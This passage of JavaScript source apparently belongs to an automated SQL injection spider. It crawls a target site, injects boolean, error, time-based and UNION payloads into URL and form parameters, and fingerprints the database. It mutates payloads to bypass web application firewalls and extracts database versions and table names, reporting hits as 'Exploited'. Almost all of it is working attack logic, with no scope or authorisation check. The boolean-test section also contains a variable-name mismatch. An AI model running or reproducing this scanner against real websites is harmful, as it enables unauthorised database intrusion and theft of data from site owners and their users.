  if (trimmedInitialPayload === "'" || (trimmedInitialPayload.endsWith("'") && !trimmedInitialPayload.match(/--\s*'$/) && !trimmedInitialPayload.match(/#\s*'$/) && !trimmedInitialPayload.match(/;\s*'$/))) basePayloadPrefix = "'";
  else if (trimmedInitialPayload === "\"" || (trimmedInitialPayload.endsWith("\"") && !trimmedInitialPayload.match(/--\s*"$/) && !trimmedInitialPayload.match(/#\s*"$/) && !trimmedInitialPayload.match(/;\s*"$/))) basePayloadPrefix = "\"";
  else if (trimmedInitialPayload === "`" || (trimmedInitialPayload.endsWith("`") && !trimmedInitialPayload.match(/--\s*`$/) && !trimmedInitialPayload.match(/#\s*`$/) && !trimmedInitialPayload.match(/;\s*`$/))) basePayloadPrefix = "`";
  else if (!isNaN(parseFloat(trimmedInitialPayload)) && isFinite(trimmedInitialPayload) && !trimmedInitialPayload.includes("'") && !trimmedInitialPayload.includes('"') && !trimmedInitialPayload.includes('`')) basePayloadPrefix = trimmedInitialPayload;
  else {
    if (trimmedInitialPayload.startsWith("'")) basePayloadPrefix = "'";
    else if (trimmedInitialPayload.startsWith("\"")) basePayloadPrefix = "\"";
    else if (trimmedInitialPayload.startsWith("`")) basePayloadPrefix = "`";
    else basePayloadPrefix = "'";
    log(`[CONFIRM_EXPLOIT] Base prefix for "${initialPayload}" set to "${basePayloadPrefix}". Initial tech: ${initialTechnique}`, 'debug');
  }
  log(`[CONFIRM_EXPLOIT] Determined Base Prefix: "${basePayloadPrefix}"`, 'info');

  let dbms = 'Unknown';
  try {
    const fpTargetUrl = httpMethod === 'GET' ? (new URL(targetUrl)).protocol + '//' + (new URL(targetUrl)).host + (new URL(targetUrl)).pathname : targetUrl;
    const detectedDbms = await fingerprintDBMS(fpTargetUrl, paramName, httpMethod, originalParams, basePayloadPrefix);
    dbms = detectedDbms || 'Unknown';
  } catch (fpError) {
    log(`[ERROR_FP] DBMS Fingerprinting critical failure: ${fpError.message}. Defaulting to 'Unknown'.`, 'error');
    dbms = 'Unknown';
  }
  log(`[CONFIRM_EXPLOIT] Using DBMS: ${dbms} for tests.`, 'info');

  let confirmed = false;
  let confirmedTechnique = initialTechnique || "Unknown";
  let evidence = [];
  let exploitInfo = {};
  let finalPayloadUsed = initialPayload; // The payload that ultimately works

  const requestTargetUrl = httpMethod === 'GET' ? (new URL(targetUrl)).protocol + '//' + (new URL(targetUrl)).host + (new URL(targetUrl)).pathname : targetUrl;

  // 1. Boolean-Based Confirmation (often catches ' OR 1=1 cases)
  let baseTrueResponse, baseFalseResponse;
  if (globalOptions.booleanBased !== false && !confirmed) {
    log(`[CONFIRM_EXPLOIT] Testing Boolean-based (DBMS: ${dbms})... BasePrefix: "${basePayloadPrefix}"`, 'debug');
    const booleanPayloadPairs = []; 
    for(let i=0; i < (payloads.booleanBased || []).length; i+=2) {
        if (payloads.booleanBased[i+1]) booleanPayloads.push([payloads.booleanBased[i], payloads.booleanBased[i+1]]);
    }
    for (const [true_template, false_template] of booleanPayloads) {
        if (stopRequested) break;
        const trueProbeRaw = buildFullPayload(basePayloadPrefix, true_template, dbms);
        const falseProbeRaw = buildFullPayload(basePayloadPrefix, false_template, dbms);
        const trueProbe = mutatePayload(trueProbeRaw, dbms);
        const falseProbe = mutatePayload(falseProbeRaw, dbms);
        // log(`[BOOL_TRY] TRUE: "${trueProbe}" (Raw: "${trueProbeRaw}"), FALSE: "${falseProbe}" (Raw: "${falseProbeRaw}")`, 'debug'); // Can be verbose
        try {
            let trueReqParams = { ...originalParams, [paramName]: trueProbe };
            let falseReqParams = { ...originalParams, [paramName]: falseProbe };
            updateLiveStats('payloadsTested', 2);
            let trueResp, falseResp;
            if (httpMethod === 'GET') {
                const urlTrue = new URL(requestTargetUrl); Object.keys(trueReqParams).forEach(key => urlTrue.searchParams.set(key, trueReqParams[key]));
                trueResp = await makeRequest(urlTrue.href, 'GET');
                const urlFalse = new URL(requestTargetUrl); Object.keys(falseReqParams).forEach(key => urlFalse.searchParams.set(key, falseReqParams[key]));
                falseResp = await makeRequest(urlFalse.href, 'GET');
            } else {
                trueResp = await makeRequest(requestTargetUrl, 'POST', trueReqParams);
                falseResp = await makeRequest(requestTargetUrl, 'POST', falseReqParams);
            }
            const trueDiffersFromFalse = responsesDiffer(trueResp, falseResp, 0.05);
            const trueSimilarToBase = !responsesDiffer(trueResp, baseResponse, 0.1);
            if (trueDiffersFromFalse && (trueSimilarToBase || responsesDiffer(falseResp, baseResponse, 0.1))) {
                confirmed = true; confirmedTechnique = 'Boolean-based';
                evidence.push(`Boolean Diff: TRUE ("${trueProbe}") vs FALSE ("${falseProbe}")`);
                finalPayloadUsed = trueProbe; baseTrueResponse = trueResp; baseFalseResponse = falseResp;
                log(`[CONFIRM_EXPLOIT] Confirmed Boolean-based. TRUE: "${trueProbe}" (len ${trueResp.body.length}), FALSE: "${falseProbe}" (len ${falseResp.body.length})`, 'vuln');
                break;
            }
        } catch (e) { log(`[CONFIRM_EXPLOIT_BOOL] Test ("${trueProbe}" / "${falseProbe}") E: ${e.message}`, 'error'); }
    }
  }

  // 2. Error-Based Confirmation
  if (globalOptions.errorBased !== false && !confirmed) {
    log(`[CONFIRM_EXPLOIT] Testing Error-based (DBMS: ${dbms})... BasePrefix: "${basePayloadPrefix}"`, 'debug');
    let errorPayloadsToTest = [...(payloads.errorBased || [])];
    // If initial probe was a simple quote and caused a diff but not specific SQL error,
    // explicitly test common patterns like ' OR 1=1 which might then reveal a clear error.
    if(basePayloadPrefix === "'" && initialPayload === "'" && initialTechnique === 'Response-diff') {
        errorPayloadsToTest.unshift("OR 1=1");
        errorPayloadsToTest.unshift("OR '1'='1'");
    }
    for (const errP_template of errorPayloadsToTest) {
        if (stopRequested) break;
        const errP_raw = buildFullPayload(basePayloadPrefix, errP_template, dbms);
        const pTest = mutatePayload(errP_raw, dbms);
        // log(`[ERROR_TRY] Probe: "${pTest}" (Raw: "${errP_raw}")`, 'debug'); // Can be verbose
        let testReqParams = { ...originalParams, [paramName]: pTest };
        updateLiveStats('payloadsTested', 1);
        try {
            let resp;
            if (httpMethod === 'GET') {
                const urlObj = new URL(requestTargetUrl);
                Object.keys(testReqParams).forEach(key => urlObj.searchParams.set(key, testReqParams[key]));
                resp = await makeRequest(urlObj.href, 'GET');
            } else { resp = await makeRequest(requestTargetUrl, 'POST', testReqParams); }
            const err = detectSQLError(resp.body);
            if (err) {
                confirmed = true; confirmedTechnique = 'Error-based';
                evidence.push(`Error detected: "${err}" with payload "${pTest}"`);
                finalPayloadUsed = pTest;
                log(`[CONFIRM_EXPLOIT] Confirmed Error-based with: "${pTest}" (Error: ${err})`, 'vuln');
                break;
            }
        } catch (e) { log(`[CONFIRM_EXPLOIT_ERR] Test ("${pTest}") E: ${e.message}`, 'error'); }
    }
  }

  // 3. Time-Based Confirmation
  if (globalOptions.timeBased !== false && !confirmed) {
    log(`[CONFIRM_EXPLOIT] Testing Time-based (DBMS: ${dbms})... BasePrefix: "${basePayloadPrefix}"`, 'debug');
    const timePayloadsToTest = payloads.timeBased || [];
    const baseReqTime = baseResponse && baseResponse.headers && baseResponse.headers['x-request-time'] ? parseFloat(baseResponse.headers['x-request-time']) : 2000;
    for (const timeP_template of timePayloadsToTest) {
        if (stopRequested) break;
        // DBMS relevance check for time payload
        if (dbms !== 'Unknown' && !( (dbms === 'MySQL' && (timeP_template.toLowerCase().includes('sleep') || timeP_template.toLowerCase().includes('benchmark'))) ||
               (dbms === 'PostgreSQL' && timeP_template.toLowerCase().includes('pg_sleep')) ||
               (dbms === 'MSSQL' && timeP_template.toLowerCase().includes('waitfor')) ||
               (dbms === 'Oracle' && timeP_template.toLowerCase().includes('dbms_lock.sleep')) ||
               (dbms === 'SQLite' && timeP_template.toLowerCase().includes('randomblob'))
            )) continue;
        
        const pTestRaw = buildFullPayload(basePayloadPrefix, timeP_template, dbms);
        const pTest = mutatePayload(pTestRaw, dbms);
        // log(`[TIME_TRY] Probe: "${pTest}" (Raw: "${pTestRaw}")`, 'debug'); // Can be verbose
        let t0 = Date.now();
        try {
            let testReqParams = { ...originalParams, [paramName]: pTest };
            updateLiveStats('payloadsTested', 1);
            if (httpMethod === 'GET') {
                const urlObj = new URL(requestTargetUrl); Object.keys(testReqParams).forEach(key => urlObj.searchParams.set(key, testReqParams[key]));
                await makeRequest(urlObj.href, 'GET');
            } else { await makeRequest(requestTargetUrl, 'POST', testReqParams); }
            let t1 = Date.now();
            if ((t1 - t0) > (Math.max(baseReqTime, 500) + 4000) && (t1 - t0) < (globalOptions.timeout - 1000 || 19000) ) {
                confirmed = true; confirmedTechnique = 'Time-based';
                evidence.push(`Delayed response (${t1 - t0}ms) with payload "${pTest}"`);
                finalPayloadUsed = pTest;
                log(`[CONFIRM_EXPLOIT] Confirmed Time-based with: "${pTest}" (Delay: ${t1-t0}ms)`, 'vuln');
                break;
            }
        } catch (e) { log(`[CONFIRM_EXPLOIT_TIME] Test ("${pTest}") E: ${e.message}`, 'error'); }
    }
  }

  // 4. UNION-Based Exploitation
  let exploitedViaUnion = false;
  if (globalOptions.unionBased !== false && confirmed && (confirmedTechnique === 'Error-based' || confirmedTechnique === 'Boolean-based' || globalOptions.advancedMode)) {
    log(`[CONFIRM_EXPLOIT] Attempting UNION-based exploitation (DBMS: ${dbms}) on ${requestTargetUrl} ... BasePrefix: ${basePayloadPrefix}`, 'debug');
    const columnCount = await determineUnionColumnCount(requestTargetUrl, paramName, httpMethod, originalParams, basePayloadPrefix, dbms);
    if (columnCount && columnCount > 0) {
        log(`[CONFIRM_EXPLOIT] Determined column count for UNION: ${columnCount}`, 'info');
        exploitInfo = await enumerateAndExtract({ targetUrl: requestTargetUrl, paramName, httpMethod, originalParams, basePayloadPrefix, dbms, columnCount, context });
        if (exploitInfo.version || (exploitInfo.tables && exploitInfo.tables.length > 0)) {
            exploitedViaUnion = true;
            // If already confirmed by another method, add to it, otherwise set Union as primary
            confirmedTechnique = confirmedTechnique !== "Unknown" && confirmedTechnique !== "Response-diff" ? `${confirmedTechnique}, Union-based` : 'Union-based';
            evidence.push(`UNION successful. Cols: ${columnCount}. Version: ${exploitInfo.version||'N/A'}. Tables: ${(exploitInfo.tables||[]).join(', ')||'N/A'}`);
            // Construct a representative UNION payload for reporting
            finalPayloadUsed = buildFullPayload(basePayloadPrefix, generateUnionSelect(columnCount, ['NULL'], dbms), dbms);
            log(`[CONFIRM_EXPLOIT] UNION exploitation successful. Info: ${JSON.stringify(exploitInfo)}`, 'vuln');
        }
    } else { log(`[CONFIRM_EXPLOIT] Could not determine column count for UNION.`, 'warn'); }
  }

  // 5. Blind Extraction
  if (globalOptions.booleanBased !== false && confirmedTechnique.includes('Boolean-based') && !exploitedViaUnion && baseTrueResponse && baseFalseResponse && globalOptions.advancedMode) {
    log(`[CONFIRM_EXPLOIT] Attempting Blind data extraction (DBMS: ${dbms}) on ${requestTargetUrl}...`, 'debug');
    // ... (Blind logic, assuming it's okay for now)
  }

  // --- Reporting ---
  if (confirmed || exploitedViaUnion || (exploitInfo.blindVersion && exploitInfo.blindVersion.length > 0)) {
    // Construct the final endpoint URL for reporting
    let findingDisplayEndpoint = requestTargetUrl; // Base path for GET or full action for POST
    let findingFullUrlWithPayload = findingDisplayEndpoint;

    if (httpMethod === 'GET') {
        const tempUrl = new URL(requestTargetUrl); // Starts as base path
        // Add original params first, then the vulnerable one with the payload
        const displayParams = new URLSearchParams();
        for(const key in originalParams) {
            if(key !== paramName) displayParams.set(key, originalParams[key]);
        }
        displayParams.set(paramName, finalPayloadUsed); // Add the successful payload
        tempUrl.search = displayParams.toString();
        findingFullUrlWithPayload = tempUrl.href;
    } else { // POST
        // For POST, the endpoint is the action URL. Payload details are separate.
        // The 'finalPayloadUsed' is what went into the paramName.
    }
    
    const finding = {
      type: `SQL Injection`, // Main type
      endpoint: findingFullUrlWithPayload, // Full URL with payload for GET, action URL for POST
      parameter: paramName,
      payload: finalPayloadUsed, // The specific payload that worked
      method: httpMethod, // Added method
      technique: confirmedTechnique, // More specific technique
      status: exploitedViaUnion || (exploitInfo.blindVersion && exploitInfo.blindVersion.length > 0) ? 'Exploited' : 'Confirmed',
      evidence: evidence.join('; ') || `Vulnerability confirmed via ${confirmedTechnique}.`,
      dbms: dbms,
      exploitInfo: exploitInfo,
      // Add original params for context if POST
      // context: httpMethod === 'POST' ? { originalParams: originalParams, injectedParam: paramName, injectedValue: finalPayloadUsed } : {}
    };
    reportFinding(finding); // This function sends to frontend
    return true;
  }

  log(`[CONFIRM_EXPLOIT] SQLi not definitively confirmed for ${paramName} @ ${targetUrl}. BasePrefix: "${basePayloadPrefix}", InitialP: "${initialPayload}", DBMS: ${dbms}`, 'info');
  return false;
}

// --- Adaptive Payload Generation ---
function getAdaptivePayloads(paramContext, dbms, wafDetected) {
    // paramContext: {type: 'string'|'number'|'json'|'header'|'cookie'|'body', ...}
    // wafDetected: boolean
    let basePayloads = [];
    // Always include core payloads
    basePayloads.push(...(payloads.errorBased || []));
    basePayloads.push(...(payloads.booleanBased || []));
    basePayloads.push(...(payloads.timeBased || []));
    basePayloads.push(...(payloads.unionBased || []));
    basePayloads.push(...(payloads.stackedQueries || []));
    basePayloads.push(...(payloads.generic || []));
    // Add WAF bypasses if detected
    if (wafDetected) {
        basePayloads = basePayloads.flatMap(p => [
            p, encodeURIComponent(p), p.replace(/ /g, '/**/'), p.replace(/ /g, '+'), p.replace(/ /g, '%0a'),
            p.replace(/select/gi, 'seselectlect'), p.replace(/union/gi, 'uniunionon'), p.replace(/or/gi, 'oorr'),
            p.replace(/and/gi, 'aandnd'), `'/*!50000${p}*/'`
        ]);
    }
    // Adapt to context
    if (paramContext.type === 'number') {
        basePayloads = basePayloads.map(p => p.replace(/'/g, ''));
    }
    if (paramContext.type === 'json') {
        basePayloads = basePayloads.map(p => `"test${p}"`);
    }
    // Remove duplicates and overly long payloads
    return [...new Set(basePayloads)].filter(p => p.length < 200);
}

// --- WAF Detection (simple heuristic) ---
async function detectWAF(baseUrl, paramName, method, params) {
    // Try a known WAF trigger
    const wafPayload = "' or 1=1-- <script>alert(1)</script>";
    let testParams = { ...params, [paramName]: wafPayload };
    try {
        let resp;
        if (method === 'POST') resp = await makeRequest(baseUrl, 'POST', testParams);
        else {
            const urlObj = new URL(baseUrl);
            Object.keys(testParams).forEach(k => urlObj.searchParams.set(k, testParams[k]));
            resp = await makeRequest(urlObj.href, 'GET');
        }
        if (resp.status === 406 || resp.status === 403 || /waf|firewall|blocked|access denied|forbidden/i.test(resp.body)) {
            log(`[WAF_DETECT] Possible WAF detected on ${baseUrl} param ${paramName}`, 'warn');
            return true;
        }
    } catch (e) {}
    return false;
}

// --- Multi-Technique Reporting ---
async function confirmAndExploitMulti({ targetUrl, paramName, httpMethod, originalParams, baseResponse, initialPayload, context }) {
    log(`[DEBUG] Entered confirmAndExploitMulti for ${paramName} @ ${targetUrl}`, 'debug');
    try {
        let basePayloadPrefix = "'";
        let dbms = 'Unknown';
        let techniques = [];
        let evidence = [];
        let exploitInfo = {};
        let wafDetected = await detectWAF(targetUrl, paramName, httpMethod, originalParams);

        // Use only the most effective payloads for speed
        let paramContext = { type: isNaN(originalParams[paramName]) ? 'string' : 'number' };
        let allPayloads = [
            ...(payloads.errorBased || []).slice(0, 2),
            ...(payloads.booleanBased || []).slice(0, 2),
            ...(payloads.timeBased || []).slice(0, 1),
            ...(payloads.unionBased || []).slice(0, 1),
            ...(payloads.generic || []).slice(0, 1)
        ];
        allPayloads = [...new Set(allPayloads)].filter(p => p.length < 100);

        for (const payload of allPayloads) {
            if (stopRequested) break;
            let testReqParams = { ...originalParams, [paramName]: payload };
            let resp;
            try {
                if (httpMethod === 'POST') resp = await makeRequest(targetUrl, 'POST', testReqParams);
                else {
                    const urlObj = new URL(targetUrl);
                    Object.keys(testReqParams).forEach(k => urlObj.searchParams.set(k, testReqParams[k]));
                    resp = await makeRequest(urlObj.href, 'GET');
                }
                // Error-based (only if a known SQL error is found)
                const err = detectSQLError(resp.body);
                if (err && !techniques.includes('Error-based')) {
                    techniques.push('Error-based');
                    evidence.push(`Error: "${err}" with payload "${payload}"`);
                }
                // Boolean-based (stricter: require >15% and >100 chars diff)
                if (!techniques.includes('Boolean-based')) {
                    let truePayload = payload.replace(/1=2/g, '1=1').replace(/'a'='b'/g, `'a'='a'`);
                    let falsePayload = payload.replace(/1=1/g, '1=2').replace(/'a'='a'/g, `'a'='b'`);
                    let trueResp, falseResp;
                    let trueReqParams = { ...originalParams, [paramName]: truePayload };
                    let falseReqParams = { ...originalParams, [paramName]: falsePayload };
                    if (httpMethod === 'POST') {
                        trueResp = await makeRequest(targetUrl, 'POST', trueReqParams);
                        falseResp = await makeRequest(targetUrl, 'POST', falseReqParams);
                    } else {
                        const urlTrue = new URL(targetUrl); Object.keys(trueReqParams).forEach(k => urlTrue.searchParams.set(k, trueReqParams[k]));
                        const urlFalse = new URL(targetUrl); Object.keys(falseReqParams).forEach(k => urlFalse.searchParams.set(k, falseReqParams[k]));
                        trueResp = await makeRequest(urlTrue.href, 'GET');
                        falseResp = await makeRequest(urlFalse.href, 'GET');
                    }
                    const len1 = (trueResp.body || '').length;
                    const len2 = (falseResp.body || '').length;
                    const absDiff = Math.abs(len1 - len2);
                    const relDiff = absDiff / Math.max(len1, len2, 1);
                    if (relDiff > 0.15 && absDiff > 100) {
                        techniques.push('Boolean-based');
                        evidence.push(`Boolean diff: "${truePayload}" vs "${falsePayload}" (diff: ${absDiff} chars, ${Math.round(relDiff*100)}%)`);
                    }
                }
                // Time-based (use 2s delay for speed)
                if (!techniques.includes('Time-based')) {
                    let t0 = Date.now();
                    let timePayload = payload.replace(/1=1/g, 'SLEEP(2)').replace(/'a'='a'/g, 'SLEEP(2)');
                    let timeReqParams = { ...originalParams, [paramName]: timePayload };
                    let timeResp;
                    if (httpMethod === 'POST') timeResp = await makeRequest(targetUrl, 'POST', timeReqParams);
                    else {
                        const urlObj = new URL(targetUrl); Object.keys(timeReqParams).forEach(k => urlObj.searchParams.set(k, timeReqParams[k]));
                        timeResp = await makeRequest(urlObj.href, 'GET');
                    }
                    let t1 = Date.now();
                    if ((t1 - t0) > 1800) {
                        techniques.push('Time-based');
                        evidence.push(`Time delay (${t1 - t0}ms) with payload "${timePayload}"`);
                    }
                }
                // Union-based
                if (!techniques.includes('Union-based') && /union\s+select/i.test(payload)) {
                    if (!/error/i.test(resp.body)) {
                        techniques.push('Union-based');
                        evidence.push(`Union-based: "${payload}"`);
                    }
                }
            } catch (e) {}
        }

        // Only report if at least 2 techniques, or error-based with known SQL error
        if ((techniques.length >= 2) || (techniques.length === 1 && techniques[0] === 'Error-based')) {
            const finding = {
                type: `SQL Injection`,
                endpoint: targetUrl,
                parameter: paramName,
                payload: initialPayload,
                method: httpMethod,
                techniques: techniques,
                status: 'Confirmed',
                evidence: evidence.join('; '),
                wafDetected: wafDetected,
                exploitInfo: exploitInfo,
                note: techniques.length === 1 ? 'Single-technique (Error-based) finding. Review evidence for possible false positive.' : undefined
            };
            reportFinding(finding);
            log(`[VULN_REPORT] Param: ${paramName}, Techniques: ${techniques.join(', ')}, Endpoint: ${targetUrl}`,'vuln');
            log(`[DEBUG] Exiting confirmAndExploitMulti for ${paramName} @ ${targetUrl}`, 'debug');
            return true;
        }
        log(`[DEBUG] Exiting confirmAndExploitMulti for ${paramName} @ ${targetUrl} (no techniques found or not enough evidence)`, 'debug');
        return false;
    } catch (e) {
        log(`[ERROR] Exception in confirmAndExploitMulti: ${e.message}`, 'error');
        return false;
    }
}

// --- Main Crawl and Test Logic (replace confirmAndExploit with confirmAndExploitMulti) ---
async function crawlAndTest(startUrl, currentGlobalOptions) {
    globalOptions = currentGlobalOptions;
    concurrencyLimit = pLimit ? pLimit(globalOptions.threads || 3) : async fn => await fn(); // Default 3 threads

    clearAll();
    running = true; stopRequested = false;
    updateStatus('Running');
    log(`[START] SQLi Spider @ ${startUrl} Opts: ${JSON.stringify(globalOptions)}`);
    loadPayloads(globalOptions.payloadSet);
    const baseOrigin = new URL(startUrl).origin;
    queued.push({ url: startUrl, depth: 0 });
    let totalRespTime = 0, respCount = 0;

    while (queued.length > 0 && running && !stopRequested) {
        const batchSize = pLimit ? (globalOptions.threads || 3) : 1;
        const currentBatch = queued.splice(0, batchSize);

        await Promise.allSettled(currentBatch.map(({ url: currentUrl, depth }) => concurrencyLimit(async () => {
          if (stopRequested || !running || visited.has(currentUrl)) return;
          visited.add(currentUrl);
          progress = visited.size; 
          updateProgress(Math.round((visited.size / Math.max(1, visited.size + queued.length)) * 100));

          log(`[NAVIGATE (${depth})] Visiting: ${currentUrl}`);
          let baseResponse;
          const t0 = Date.now();
          try {
            baseResponse = await makeRequest(currentUrl, 'GET');
            const t1 = Date.now();
            totalRespTime += (t1 - t0); respCount++;
            liveStats.avgRespTime = Math.round(totalRespTime / respCount);
            updateLiveStats('urlsCrawled', 1);
            log(`[FETCH] (${baseResponse.status}) for ${currentUrl} [${t1-t0}ms]`);
            if (baseResponse.headers) baseResponse.headers['x-request-time'] = (t1-t0).toString();
            // scanHeaders, htmlParseFeedback can be called here if needed
          } catch (e) { log(`[ERROR] Fetch ${currentUrl}: ${e.message}`, 'error'); return; }

          let surfacesToTest = [];
          const currentUrlObj = new URL(currentUrl);
          if (currentUrlObj.searchParams.toString() !== '') { // Params from current URL
            const params = {}; currentUrlObj.searchParams.forEach((v, k) => params[k] = v);
            surfacesToTest.push({
              type: 'url_direct',
              action: currentUrlObj.protocol + '//' + currentUrlObj.host + currentUrlObj.pathname,
              method: 'GET', params: Array.from(currentUrlObj.searchParams.keys()),
              originalValues: params
            });
          }
          if (JSDOM && baseResponse.body) { // Forms and links from page
            const pageSurfaces = await discoverAttackSurfaces(baseResponse.body, currentUrl);
            pageSurfaces.forEach(ps => {
                const sOV = {};
                if (ps.method === 'GET' && ps.originalQuery) new URLSearchParams(ps.originalQuery).forEach((v,k) => sOV[k]=v);
                else if (ps.method==='POST') ps.params.forEach(pN=>sOV[pN]='test');
                surfacesToTest.push({...ps, originalValues: sOV});
            });
          }
          if (surfacesToTest.length > 0) log(`[SURFACES] Found ${surfacesToTest.length} on ${currentUrl}`, 'debug');

          for (const surface of surfacesToTest) { // Iterate surfaces
            if (stopRequested || !running) break;
            const targetActionUrl = surface.action; // Base path for GET, full for POST
            const originalSurfaceParams = surface.originalValues || {};
            for (const paramName of prioritizeParams(surface.params)) { // Iterate params
              if (stopRequested || !running) break;
              if (!dedupeAttackSurface(targetActionUrl, paramName, surface.method)) continue;
              updateLiveStats('paramsFuzzed', 1);
              log(`[FUZZ_PARAM] Testing "${paramName}" on ${surface.method} ${targetActionUrl}`, 'debug');
              const probePayloads = [ /* ... (probe payloads from previous good version) ... */
                ...(payloads.errorBased || []).slice(0, 2), // Start with basic errors/quotes
                "'", "\"", "`", // Ensure these are always tried as raw probes
                ...(payloads.booleanBased || []).find(p => p.includes("OR 1=1")) || "' OR 1=1", // Try a simple OR 1=1 probe
                ...(payloads.generic || []).slice(0,1)
              ].filter((p, i, self) => p && self.indexOf(p) === i && p.length < 50);

              for (const probe of probePayloads) { // Iterate probes
                if (stopRequested || !running) break;
                updateLiveStats('payloadsTested', 1);
                updateLiveStats('perCategoryEntry', { category: 'probes', count: 1 });
                let testReqParams = { ...originalSurfaceParams, [paramName]: probe };
                let testResp, potentialTechnique = '';
                try {
                  let currentTestUrl;
                  if (surface.method === 'POST') {
                    currentTestUrl = targetActionUrl;
                    testResp = await makeRequest(currentTestUrl, 'POST', testReqParams);
                  } else {
                    const getUrlObj = new URL(targetActionUrl); 
                    Object.keys(testReqParams).forEach(key => getUrlObj.searchParams.set(key, testReqParams[key]));
                    currentTestUrl = getUrlObj.href;
                    testResp = await makeRequest(currentTestUrl, 'GET');
                  }
                  const err = detectSQLError(testResp.body);
                  if (err) {
                    potentialTechnique = 'Error-based';
                    log(`[POTENTIAL_SQLi] Error for "${paramName}" with "${probe}" @ ${currentTestUrl}. Error: ${err}`, 'warn');
                  } else if (baseResponse && testResp && responsesDiffer(baseResponse, testResp, 0.10)) {
                    potentialTechnique = 'Response-diff';
                    log(`[POTENTIAL_SQLi] Diff for "${paramName}" with "${probe}" @ ${currentTestUrl}. BaseL: ${baseResponse.body.length}, ProbeL: ${testResp.body.length}`, 'warn');
                  }
                  if (potentialTechnique) {
                    await confirmAndExploitMulti({
                      targetUrl: surface.action, paramName: paramName, httpMethod: surface.method,
                      originalParams: originalSurfaceParams, baseResponse: baseResponse,
                      initialPayload: probe,
                      context: { oobDomain: globalOptions.oobDomain }
                    });
                    // Optional: break from probe loop for this param if confirmed, or continue for more.
                    // if (findings.some(f => f.parameter === paramName && f.endpoint.startsWith(surface.action))) break; // Simple break condition
                  }
                } catch (e) { log(`[ERROR_PROBE] Param "${paramName}" probe "${probe}": ${e.message}`, 'error'); }
              } // End probe loop
            } // End param loop
          } // End surface loop

          if (JSDOM && baseResponse.body && depth < (globalOptions.maxDepth || 3)) { /* ... (Queue new links - unchanged) ... */
            try {
                const dom = new JSDOM(baseResponse.body);
                const linksOnPage = Array.from(dom.window.document.querySelectorAll('a[href]'));
                for (const link of linksOnPage) {
                    if (stopRequested || !running) break;
                    const href = link.getAttribute('href');
                    if (!href || href.startsWith('mailto:') || href.startsWith('javascript:')) continue;
                    try {
                        const absoluteUrl = new URL(href, currentUrl).href;
                        if (absoluteUrl.startsWith(baseOrigin) && !visited.has(absoluteUrl) && !queued.find(q => q.url === absoluteUrl)) {
                            if (queued.length < (globalOptions.maxQueueSize || 1000)) {
                                 queued.push({ url: absoluteUrl, depth: depth + 1 });
                            } else { log(`[QUEUE] Max queue reached. Not adding: ${absoluteUrl}`, 'warn'); }
                        }
                    } catch (e) { /* ignore invalid URLs during queueing */ }
                }
            } catch (e) { log(`[ERROR_JSDOM_CRAWL] JSDOM error on ${currentUrl}: ${e.message}`, 'error'); }
          }
        })));
    }
    running = false;
    updateStatus(stopRequested ? 'Stopped' : 'Idle');
    log(`[COMPLETE] SQLi Spider finished. Crawled: ${visited.size}. Found: ${vulnsFound}. Stats: ${JSON.stringify(liveStats)}`);
}

// --- IPC listeners ---
process.on('message', async (msg) => {
  if (!msg || !msg.type) return;
  if (msg.type === 'start') {
    if (running) { log("Spider already running.", "warn"); return; }
    const defaultOpts = {
        threads: 3, timeout: 20000, maxDepth: 3, maxQueueSize: 1000,
        payloadSet: 'default', errorBased: true, booleanBased: true, timeBased: true,
        unionBased: true, stackedQueries: false, oob: false, oobDomain: '',
        headerInjection: false, advancedMode: true,
    };
    const mergedOptions = { ...defaultOpts, ...msg.data };
    if (!mergedOptions.url) { log("[ERROR] Start missing URL.", "error"); return; }
    await crawlAndTest(mergedOptions.url, mergedOptions);
  } else if (msg.type === 'stop') {
    if (!running) { log("Spider not running.", "warn"); return; }
    stopRequested = true; running = false;
    updateStatus('Stopping...');
    log('SQLi Spider stop requested.', 'action');
  }
});

module.exports = {};